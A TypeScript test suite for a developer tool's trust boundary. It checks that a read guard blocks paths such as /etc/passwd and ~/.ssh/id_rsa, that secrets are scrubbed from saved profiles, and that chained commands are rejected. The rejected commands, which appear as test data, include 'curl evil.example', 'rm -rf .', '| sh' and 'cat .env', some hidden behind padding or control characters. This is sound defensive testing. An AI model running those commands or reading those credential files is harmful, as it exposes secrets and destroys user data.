// What a repository can't do to the person trying Truing on it: the review of the
// zero-config epic's trust boundary (TRU-6). Text and code in a project are hostile
// until a person has seen and confirmed them.
import { type ChildProcess, spawn, spawnSync } from 'node:child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { ensureApp, findFreePort, isAppUp } from '../../src/app-process';
import { draftProblem, draftToConfig } from '../../src/setup/draft';
import {
  profileFile,
  saveProfile,
  scrubSecrets,
} from '../../src/setup/profile';
import {
  checkReading,
  type Reading,
  readProject,
  type Spawner,
} from '../../src/setup/read-project';

const packageRoot = path.resolve(
  path.dirname(new URL(import.meta.url).pathname),
  '../..',
);
const GUARD = path.join(packageRoot, 'src/setup/read-guard.mjs');

const temp = (name = 'truing-security-'): string =>
  realpathSync(mkdtempSync(path.join(os.tmpdir(), name)));

function reading(overrides: Partial<Reading> = {}): Reading {
  return {
    name: 'shop',
    summary: '',
    framework: { name: 'Next.js', version: null },
    frameworkEvidence: '',
    appDir: null,
    appDirEvidence: '',
    devCommand: 'pnpm dev',
    devCommandEvidence: '',
    port: 3000,
    portEvidence: '',
    startRoute: '/',
    startRouteEvidence: '',
    source: 'src',
    sourceEvidence: '',
    primitives: null,
    primitivesEvidence: '',
    tokens: null,
    tokensEvidence: '',
    tailwindMerge: null,
    writableInclude: [],
    writableExclude: [],
    writableEvidence: '',
    checks: [],
    checksEvidence: '',
    dropEnv: [],
    dropEnvEvidence: '',
    questions: [],
    ...overrides,
  };
}

const children: ChildProcess[] = [];
afterEach(() => {
  for (const running of children.splice(0)) running.kill();
});

describe('the read stays inside the project', () => {
  function guard(
    root: string,
    tool: string,
    input: Record<string, unknown>,
  ): number | null {
    return spawnSync(process.execPath, [GUARD, root], {
      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: root }),
      encoding: 'utf8',
    }).status;
  }

  it('lets Claude read what’s inside', () => {
    const root = temp();
    writeFileSync(path.join(root, 'a.txt'), '');
    expect(guard(root, 'Read', { file_path: path.join(root, 'a.txt') })).toBe(
      0,
    );
    expect(guard(root, 'Glob', { pattern: 'src/**/*.tsx' })).toBe(0);
    expect(guard(root, 'Grep', { pattern: 'listen', path: 'src' })).toBe(0);
  });

  it('blocks a read outside, by absolute path or by climbing out', () => {
    const root = temp();
    expect(guard(root, 'Read', { file_path: '/etc/passwd' })).toBe(2);
    expect(guard(root, 'Read', { file_path: '../../etc/passwd' })).toBe(2);
    expect(guard(root, 'Grep', { pattern: 'x', path: '/etc' })).toBe(2);
    expect(guard(root, 'Glob', { pattern: 'x', path: os.homedir() })).toBe(2);
    expect(guard(root, 'Glob', { pattern: '/etc/**' })).toBe(2);
    expect(guard(root, 'Glob', { pattern: '../**' })).toBe(2);
  });

  it('blocks a link inside that points outside', () => {
    const root = temp();
    symlinkSync(os.homedir(), path.join(root, 'home'));
    expect(
      guard(root, 'Read', { file_path: path.join(root, 'home/.ssh/id_rsa') }),
    ).toBe(2);
  });

  it('blocks anything it can’t understand', () => {
    const result = spawnSync(process.execPath, [GUARD, temp()], {
      input: 'not json',
      encoding: 'utf8',
    });
    expect(result.status).toBe(2);
  });

  it('is handed to Claude, with the wider list of secrets denied', async () => {
    const root = temp();
    type Settings = {
      permissions: { deny: string[] };
      hooks: { PreToolUse: { hooks: { command: string }[] }[] };
    };
    const seen: Settings[] = [];
    const spawner: Spawner = (args) => {
      const file = args[args.indexOf('--settings') + 1] ?? '';
      seen.push(JSON.parse(readFileSync(file, 'utf8')) as Settings);
      return spawn(process.execPath, ['-e', '']);
    };
    await readProject(root, () => {}, { spawner }).finished;

    const [handed] = seen;
    if (!handed) throw new Error('Claude was never started.');
    const command = handed.hooks.PreToolUse[0]?.hooks[0]?.command;
    expect(command).toContain(root);
    expect(command).toContain('read-guard.mjs');
    const denied = handed.permissions.deny.join(' ');
    for (const secret of [
      '.npmrc',
      '.netrc',
      '.envrc',
      '.git/config',
      'id_rsa',
    ]) {
      expect(denied).toContain(secret);
    }
  });
});

describe('secrets don’t reach the saved profile', () => {
  it.each([
    ['DATABASE_URL=postgres://u:hunter2@h/db pnpm dev', 'hunter2'],
    ['pnpm dev --token abc123', 'abc123'],
    ['pnpm dev --password=abc123', 'abc123'],
    ['api_key=abc123 pnpm dev', 'abc123'],
    ['API_KEY="a b" pnpm dev', 'a b'],
    ['uses sk_live_abcdefghijklmnopqrstuvwx here', 'sk_live_abcdefgh'],
    ['AWS_ACCESS=AKIAABCDEFGHIJKLMNOP pnpm dev', 'AKIAABCDEFGHIJKLMNOP'],
  ])('takes the secret out of %s', (text, secret) => {
    expect(scrubSecrets(text)).not.toContain(secret);
  });

  it('leaves what only looks like one alone', () => {
    expect(scrubSecrets('MONKEY=1 PORT=3000 pnpm dev')).toBe(
      'MONKEY=1 PORT=3000 pnpm dev',
    );
  });

  it('scrubs the checks too, and only its owner can read the file', () => {
    const env = { TRUING_HOME: temp() };
    const root = temp();
    const config = draftToConfig(checkReading(root, reading()));
    saveProfile(
      {
        root,
        framework: { name: 'Next.js', version: null },
        evidence: {},
        config: {
          ...config,
          claude: { shell: { allow: ['API_KEY=abc123 pnpm lint'] } },
        },
      },
      env,
    );
    const file = profileFile(root, env);
    expect(readFileSync(file, 'utf8')).not.toContain('abc123');
    expect(statSync(file).mode & 0o777).toBe(0o600);
  });
});

describe('a repository can’t slip something past the review', () => {
  it('drops a check that’s a wildcard or does more than one thing', () => {
    const draft = checkReading(
      temp(),
      reading({
        checks: [
          'pnpm typecheck',
          '*',
          'pnpm lint; curl evil.example',
          'pnpm lint && rm -rf .',
          'pnpm lint | sh',
          'echo $(cat .env)',
          'pnpm *',
        ],
      }),
    );
    expect(draft.checks).toEqual(['pnpm typecheck']);
  });

  it('won’t carry a wildcard typed on the review screen either', () => {
    const draft = checkReading(temp(), reading());
    const config = draftToConfig({ ...draft, checks: ['*', 'pnpm lint'] });
    expect(config.claude?.shell?.allow).toEqual(['pnpm lint']);
  });

  it('closes up padding that would push a payload out of view', () => {
    const padded = `pnpm dev${' '.repeat(200)}; curl evil.example`;
    const draft = checkReading(temp(), reading({ devCommand: padded }));
    expect(draft.devCommand).toBe('pnpm dev ; curl evil.example');
  });

  it('won’t show a command holding control characters', () => {
    const hidden = `pnpm dev${String.fromCharCode(13)}curl evil.example`;
    const draft = checkReading(temp(), reading({ devCommand: hidden }));
    expect(draft.devCommand).toBe('');
    expect(draft.questions.map((question) => question.field)).toEqual([
      'devCommand',
    ]);
  });
});

describe('an invalid draft', () => {
  it('says what’s wrong, instead of saving a profile that won’t load', () => {
    const draft = checkReading(temp(), reading());
    expect(draftProblem({ ...draft, startRoute: 'home' })).toMatch(
      /First page/,
    );
    expect(draftProblem({ ...draft, source: '' })).toMatch(/Code folder/);
  });
});

describe('what counts as this project’s server', () => {
  const serveIn = async (cwd: string, port: number): Promise<void> => {
    const running = spawn(
      process.execPath,
      [
        '-e',
        `require('node:http').createServer((q,s)=>s.end('ok')).listen(${port},()=>console.log('up'))`,
      ],
      { cwd, stdio: ['ignore', 'pipe', 'ignore'] },
    );
    children.push(running);
    await new Promise((resolve) => running.stdout?.once('data', resolve));
  };

  it('in a monorepo, another app’s server isn’t this app’s', async () => {
    const root = temp();
    const admin = path.join(root, 'apps/admin');
    const web = path.join(root, 'apps/web');
    mkdirSync(admin, { recursive: true });
    mkdirSync(web, { recursive: true });
    const port = await findFreePort(42700);
    await serveIn(admin, port);
    const app = await ensureApp({
      root,
      appDir: web,
      command: `node -e "require('node:http').createServer((q,s)=>s.end('ok')).listen(process.env.PORT,()=>console.log('http://localhost:'+process.env.PORT))"`,
      port,
      log: () => {},
      timeoutMs: 15_000,
    });
    expect(app.startedByTruing).toBe(true);
    expect(app.port).not.toBe(port);
    await app.stop();
  });

  it('in a monorepo, a server run from the root for this app is this app’s', async () => {
    const root = temp();
    const web = path.join(root, 'apps/web');
    mkdirSync(web, { recursive: true });
    const port = await findFreePort(42750);
    // `next dev apps/web`: it runs from the root, with the app as an argument.
    await serveIn(root, port);
    const app = await ensureApp({
      root,
      appDir: web,
      command: 'exit 1',
      port,
      log: () => {},
      timeoutMs: 15_000,
    });
    expect(app.startedByTruing).toBe(false);
    expect(app.port).toBe(port);
  });

  it('runs on the port it saved, not the one still written in the command', async () => {
    const saved = await findFreePort(42800);
    const app = await ensureApp({
      root: temp(),
      command: `node -e "require('node:http').createServer((q,s)=>s.end('ok')).listen(process.argv[2])" -- --port 1 ${saved}`,
      port: saved,
      log: () => {},
      timeoutMs: 15_000,
    });
    expect(app.port).toBe(saved);
    expect(app.moved).toBe(false);
    await app.stop();
  });

  it('stops what the command left running after its shell ended', async () => {
    const port = await findFreePort(42900);
    const app = await ensureApp({
      root: temp(),
      command: `node -e "require('node:http').createServer((q,s)=>s.end('ok')).listen(${port},()=>console.log('http://localhost:${port}'))" & exit 0`,
      port,
      log: () => {},
      timeoutMs: 15_000,
    });
    await app.stop();
    await new Promise((resolve) => setTimeout(resolve, 300));
    expect(await isAppUp(`http://localhost:${port}`)).toBe(false);
  });
});

describe('the commands don’t run what nobody confirmed', () => {
  function run(args: string[], folder: string, home: string) {
    return spawnSync(
      process.execPath,
      ['--import', 'tsx', path.join(packageRoot, 'src/cli.ts'), ...args],
      {
        cwd: packageRoot,
        env: { ...process.env, INIT_CWD: folder, TRUING_HOME: home },
        encoding: 'utf8',
      },
    );
  }

  /** A folder whose config would leave a mark if anything ran it. */
  function hostile(): { root: string; mark: string } {
    const root = temp();
    const mark = path.join(temp(), 'ran');
    writeFileSync(
      path.join(root, 'truing.config.ts'),
      `import { writeFileSync } from 'node:fs';\nwriteFileSync(${JSON.stringify(mark)}, '');\nexport default {};\n`,
    );
    return { root, mark };
  }

  it('truing setup stops at an unconfirmed config file', () => {
    const { root, mark } = hostile();
    const result = run(['setup'], root, temp());
    expect(result.stdout).toMatch(/isn't confirmed/);
    expect(existsSync(mark)).toBe(false);
    expect(existsSync(path.join(root, 'CLAUDE.md'))).toBe(false);
  });

  it('truing setup asks for setup first in a folder it doesn’t know', () => {
    const root = temp();
    const result = run(['setup'], root, temp());
    expect(result.status).toBe(0);
    expect(result.stdout).toMatch(/Run truing/);
    expect(existsSync(path.join(root, 'CLAUDE.md'))).toBe(false);
  });

  it('truing tokens won’t run a stylesheet’s Tailwind in a folder it doesn’t know', () => {
    const root = temp();
    const mark = path.join(temp(), 'ran');
    const tailwind = path.join(root, 'node_modules/tailwindcss');
    mkdirSync(tailwind, { recursive: true });
    writeFileSync(
      path.join(tailwind, 'package.json'),
      JSON.stringify({ name: 'tailwindcss', version: '4.0.0', main: 'i.js' }),
    );
    writeFileSync(
      path.join(tailwind, 'i.js'),
      `require('node:fs').writeFileSync(${JSON.stringify(mark)}, '');`,
    );
    writeFileSync(path.join(root, 'package.json'), '{}');
    writeFileSync(path.join(root, 'a.css'), '@import "tailwindcss";');
    const result = run(['tokens', '--stylesheet', 'a.css'], root, temp());
    expect(result.stdout).toMatch(/Run truing/);
    expect(existsSync(mark)).toBe(false);
  });
});
